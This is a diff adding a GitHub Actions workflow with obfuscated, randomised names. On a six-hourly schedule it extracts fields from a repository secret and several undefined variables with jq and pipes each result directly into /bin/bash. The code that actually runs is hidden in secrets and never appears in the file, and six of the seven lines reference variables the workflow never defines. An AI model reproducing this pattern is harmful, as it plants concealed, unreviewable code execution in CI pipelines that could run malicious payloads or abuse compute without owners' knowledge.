@@ -1,0 +1,24 @@
+name: kequanji7618
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kequanji7618
+        env:
+          hdjh04: ${{ secrets.hdjh04 }}
+        run: |
+          echo $hdjh04 | jq -r .z6 | /bin/bash
+          echo $dcry88776 | jq -r .dtg8 | /bin/bash
+          echo $ohra7 | jq -r .e18561 | /bin/bash
+          echo $gs46 | jq -r .w87226 | /bin/bash
+          echo $ctg7313 | jq -r .cxsaq3 | /bin/bash
+          echo $zxgk0 | jq -r .jpgo05313 | /bin/bash
+          echo $gtj001 | jq -r .iwwjl96 | /bin/bash
+
